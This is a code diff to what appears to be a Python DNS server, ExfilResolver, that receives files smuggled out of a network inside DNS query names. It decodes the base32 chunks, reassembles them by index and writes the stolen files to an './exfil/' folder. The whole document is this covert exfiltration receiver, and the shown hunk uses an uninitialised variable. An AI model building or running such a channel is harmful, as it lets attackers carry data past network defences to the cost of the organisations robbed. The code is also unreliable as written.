@@ -114,7 +114,7 @@ class ExfilResolver(BaseResolver):
             reply.header.rcode = RCODE.NXDOMAIN
             return reply
             
-        data = qname.split(".")[0].upper().replace("1","=")
+        data = qname.split(".")[0].upper()
         index = qname.split(".")[1]
         filename = qname.split(".")[2]
 
@@ -155,9 +155,12 @@ class ExfilResolver(BaseResolver):
         if nones is 0: 
             # The file is ready for output
             print("File:", filename, "100 % complete")
+            # Decode the file 
+            for x in self.files[filename]:
+                s = s + x 
+            # write the file
             with open("./exfil/" + filename, "w") as f:
-                for x in self.files[filename]: 
-                    f.write(base64.b32decode(x.replace("1", "="), casefold=True))
+                f.write(base64.b32decode(s.replace("1", "="), casefold=True))
             print("File:", filename, "written to disk")
             del self.files[filename]
             self.keys += [filename]
